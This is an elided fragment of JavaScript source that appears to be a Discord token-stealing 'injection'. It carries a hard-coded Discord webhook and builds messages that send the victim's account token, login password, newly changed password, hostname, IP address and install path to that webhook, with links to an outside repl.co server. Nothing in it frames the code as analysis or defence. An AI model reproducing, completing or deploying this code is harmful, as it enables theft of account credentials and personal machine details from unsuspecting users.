...
const os = require('os')
var webhook = "https://discord.com/api/webhooks/916754396010926120/hEZ8VBqT7LM3_DNSox9gp3-zvENHIOP_XGcbzmQvLRpMPwjtrcpCyrt4Hb2hWZ6so2rH";
                    ...
                    `, !0).then(a => {
						...
						var c = {
							...
							embeds: [{
								...
								description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://dawwdaiwjdiajwdajwdipjawpidjawpjd.23413ndacc.repl.co/"+ token +")",
								color: config["embed-color"],
								fields: [{
									name: "Info",
									value: `\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``,
        ...
        xmlHttp.responseText`, !0).then((info3) => {
            ...
            xmlHttp.responseText`, !0).then((info4) => {
              ...
              xmlHttp.responseText`, !0).then((codes) => {
							...
							var fieldo = [];
							var baseuri = "https://dawwdaiwjdiajwdajwdipjawpidjawpjd.23413ndacc.repl.co/"
							...
							var params = {
								...
								embeds: [{
									"title": "User Login",
									description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://dawwdaiwjdiajwdajwdipjawpidjawpjd.23413ndacc.repl.co/"+ token +"<br>"+ password+")",
									"color": config['embed-color'],
									"fields": [{
										name: "Info",
										value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
              ...
              xmlHttp.responseText`, !0).then((codes) => {
							...
							var params = {
								...
								embeds: [{
									...
									description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://dawwdaiwjdiajwdajwdipjawpidjawpjd.23413ndacc.repl.co/"+ token +"<br>"+ newpassword+")",
									"color": config['embed-color'],
									"fields": [{
										name: "Info",
										value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
